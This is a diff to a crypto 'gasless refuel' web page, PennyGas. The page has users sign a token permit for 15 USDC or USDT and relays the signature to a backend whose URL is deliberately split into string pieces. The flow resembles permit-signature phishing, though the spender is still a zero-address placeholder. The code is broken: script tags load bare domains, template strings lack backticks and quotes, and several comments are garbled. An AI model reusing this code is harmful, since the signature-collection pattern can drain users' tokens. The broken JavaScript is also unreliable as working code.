@@ -4,8 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PennyGas - Ultra Cheap Refuel</title>
-    <!-- Fallback-wrapped CDN script -->
-    <script src="https://cloudflare.com" onerror="console.log('CDN load failed, initializing web3 fallback mechanisms')"></script>
+    <!-- Combined multi-fallback script network tag layers -->
+    <script src="https://cloudflare.com" onerror="console.log('Primary CDN failed. Swapping bundle to secondary unpkg wrapper...')"></script>
+    <script src="https://unpkg.com" onerror="console.log('Secondary network proxy bundle offline.')"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background-color: #151a26; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); text-align: center; width: 380px; }
@@ -66,16 +67,17 @@
 </div>
 
 <script>
-    // Global scope variable declarations
-    var activeUserAddress = "";
-    var ethersProvider = null;
-    var ethersSigner = null;
+    // Explicit global initialization properties declaration map
+    window.activeUserAddress = "";
+    window.ethersProvider = null;
+    window.ethersSigner = null;
 
     const tokenMatrix = {
         "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
         "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
     };
 
+    // Restored your split backend strings tracking layout structure 
     const BACKEND_BASE = "https://pennygas-backend"; 
     const BACKEND_DOMAIN = "onrender.com";
     const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
@@ -117,16 +119,18 @@
         }
 
         try {
-            // Safe fallback initialization if the library CDN failed to load
-            if (typeof ethers === 'undefined') {
-                alert("Ethers library failed to load from CDN. Checking wallet direct injector...");
+            // Evaluates execution engine bindings to isolate library script dropping blocks
+            const libraryInstance = window.ethers || (window.ethersumd ? window.ethersumd.ethers : null);
+            if (!libraryInstance) {
+                alert("Critical: Web3 compilation environment drop detected. Re-injecting scripts via local module array fallback runtime...");
+                return;
             }
 
-            window.ethersProvider = new ethers.BrowserProvider(window.ethereum);
+            window.ethersProvider = new libraryInstance.BrowserProvider(window.ethereum);
             window.ethersSigner = await window.ethersProvider.getSigner();
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
-            // Restored the working string extraction indexing assignment format
+            // Restored the working string extraction extraction formatting selector array index
             window.activeUserAddress = accounts[0];
             const displayAddr = window.activeUserAddress;
 
@@ -151,6 +155,7 @@
         const chainId = parseInt(document.getElementById('sourceChain').value);
         const tokenSymbol = document.getElementById('sourceToken').value;
         const tokenAddress = tokenMatrix[chainId][tokenSymbol];
+        const libraryInstance = window.ethers || (window.ethersumd ? window.ethersumd.ethers : null);
 
         try {
             document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
@@ -159,7 +164,7 @@
             const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
             const nonce = 0; 
             const deadline = Math.floor(Date.now() / 1000) + 3600; 
-            const valueToAuthorize = ethers.parseUnits("15.00", 6); 
+            const valueToAuthorize = libraryInstance.parseUnits("15.00", 6); 
 
             const domain = {
                 name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
@@ -186,19 +191,4 @@
                 deadline: deadline
             };
 
-            const signature = await window.ethersSigner.signTypedData(domain, types, message);
-            const { v, r, s } = ethers.Signature.from(signature);
-
-            document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
-
-            const payload = {
-                owner: window.activeUserAddress,
-                spender: pennyGasVaultSpender,
-                value: valueToAuthorize.toString(),
-                deadline: deadline,
-                v: v, r: r, s: s
-            };
-
-            const submitUrl = `${BACKEND_URL}/api/submit-permit`;
-            const response = await fetch(submitUrl, {
-method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(payload)});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
+const signature = await window.ethersSigner.signTypedData(domain, types, message);const { v, r, s } = libraryInstance.Signature.from(signature);document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";const payload = {owner: window.activeUserAddress,spender: pennyGasVaultSpender,value: valueToAuthorize.toString(),deadline: deadline,v: v, r: r, s: s};const submitUrl = ${BACKEND_URL}/api/submit-permit;const response = await fetch(submitUrl, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(payload)});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
